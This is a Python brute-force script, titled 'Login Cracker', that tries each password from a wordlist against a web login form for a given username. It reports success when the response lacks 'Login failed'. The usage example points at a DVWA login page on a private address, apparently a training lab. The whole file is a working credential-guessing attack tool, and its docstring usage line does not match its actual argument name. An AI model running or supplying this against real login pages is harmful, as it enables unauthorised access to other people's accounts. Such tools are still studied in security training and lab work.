#!/usr/bin/env python
import argparse
import requests

'''
    Run the script by providing the required arguments in the following format:
    
    python login_cracker.py --target-url http://192.168.100.32/dvwa/login.php --username admin --password_file ./passwords.txt.
    
    The script will try to login with the passwords from the provided file and print the successful password to the terminal, if found.
'''


def try_login(target_url, data_dict, password_file):
    """
    Function to try login with different passwords from the provided file.
    """
    with open(password_file, 'r') as wordlist_file:
        for line in wordlist_file:
            password = line.strip('\r\n')
            data_dict['password'] = password
            response = requests.post(target_url, data=data_dict)
            if "Login failed" not in response.content.decode(errors='ignore'):
                print('[+] Got the password --> ' + password)
                return

    print('[+] Password not found. Reached end of line.')


def main(target_url, username, password_file):
    """
    The main function that runs the program.
    """
    data_dict = {'username': username, 'password': '', 'Login': 'submit'}
    try_login(target_url, data_dict, password_file)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Login Cracker')
    parser.add_argument("-t", "--target-url", dest="target_url", type=str,
                        required=True, help="The target URL")
    parser.add_argument("-u", "--username", dest="username", type=str, required=True,
                        help="The username for login")
    parser.add_argument("-p", "--password-file", dest="password_file", type=str,
                        required=True, help="Path to the password file")

    args = parser.parse_args()

    main(args.target_url, args.username, args.password_file)
